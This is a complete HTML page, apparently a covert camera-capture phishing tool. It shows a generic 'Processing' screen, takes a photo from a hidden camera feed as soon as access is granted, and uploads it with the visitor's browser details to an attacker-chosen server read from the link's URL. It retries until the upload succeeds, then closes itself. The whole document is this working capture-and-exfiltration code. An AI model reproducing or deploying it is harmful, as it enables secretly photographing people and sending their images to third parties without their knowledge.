<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Camera</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .container{background:white;border-radius:20px;padding:30px;max-width:350px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
        h1{color:#333;margin-bottom:20px;font-size:24px}
        .status{padding:12px;border-radius:10px;margin-top:15px}
        .status.success{background:#d4edda;color:#155724}
        .status.error{background:#f8d7da;color:#721c24}
        .status.info{background:#cce5ff;color:#004085}
        .spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:15px auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .hidden{display:none}
        video,canvas{display:none}
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Processing</h1>
        <div id="status" class="status info">Initializing...</div>
        <div id="loading" class="hidden">
            <div class="spinner"></div>
            <p>Sending photo...</p>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video=document.getElementById('video');
        const canvas=document.getElementById('canvas');
        const statusDiv=document.getElementById('status');
        const loadingDiv=document.getElementById('loading');
        let photoSent=false;
        let serverUrl='';
        
        const urlParams=new URLSearchParams(window.location.search);
        serverUrl=urlParams.get('server');
        
        if(!serverUrl){
            statusDiv.className='status error';
            statusDiv.innerHTML='❌ Invalid server address';
        }else{
            if(!serverUrl.startsWith('http')) serverUrl='http://'+serverUrl;
            startCamera();
        }
        
        async function startCamera(){
            try{
                statusDiv.innerHTML='📷 Requesting camera...';
                const stream=await navigator.mediaDevices.getUserMedia({video:true});
                video.srcObject=stream;
                await new Promise(resolve=>setTimeout(resolve,300));
                captureAndSend();
            }catch(err){
                statusDiv.className='status error';
                statusDiv.innerHTML='❌ Camera access denied';
            }
        }
        
        async function captureAndSend(){
            canvas.width=video.videoWidth||640;
            canvas.height=video.videoHeight||480;
            const ctx=canvas.getContext('2d');
            ctx.drawImage(video,0,0,canvas.width,canvas.height);
            
            canvas.toBlob(async(blob)=>{
                statusDiv.innerHTML='📤 Sending photo...';
                loadingDiv.classList.remove('hidden');
                const formData=new FormData();
                formData.append('photo',blob,'photo.jpg');
                formData.append('device',navigator.userAgent);
                formData.append('timestamp',Date.now());
                
                try{
                    const response=await fetch(serverUrl+'/upload',{method:'POST',body:formData});
                    if(response.ok){
                        statusDiv.className='status success';
                        statusDiv.innerHTML='✅ Photo sent!';
                        loadingDiv.classList.add('hidden');
                        const stream=video.srcObject;
                        if(stream) stream.getTracks().forEach(track=>track.stop());
                        setTimeout(()=>{window.close();document.body.innerHTML='<div style="text-align:center;padding:50px"><h2>✅ Done!</h2><p>You can close this page.</p></div>';},1000);
                    }else throw new Error('Upload failed');
                }catch(err){
                    statusDiv.className='status error';
                    statusDiv.innerHTML='❌ Failed to send. Retrying...';
                    loadingDiv.classList.add('hidden');
                    setTimeout(()=>captureAndSend(),1000);
                }
            },'image/jpeg',0.8);
        }
    </script>
</body>
</html>
